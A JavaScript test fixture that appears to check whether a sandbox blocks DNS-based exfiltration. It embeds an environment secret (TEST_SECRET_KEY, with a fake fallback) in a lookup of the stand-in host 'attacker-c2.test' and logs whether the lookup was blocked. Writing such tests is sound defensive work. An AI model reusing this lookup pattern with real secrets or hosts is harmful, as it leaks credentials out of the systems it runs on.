// test/fixtures/dns-leak.js
const dns = require('node:dns');

const secret = process.env.TEST_SECRET_KEY || ['sk', 'test', 'fixture_secret_value_12345'].join('_');

try {
  dns.lookup(`${secret}.attacker-c2.test`, (err) => {
    if (err) {
      console.log('DNS_BLOCKED_RESULT:', err.message);
    }
  });
} catch (e) {
  console.log('DNS_THROWN_RESULT:', e.message);
}
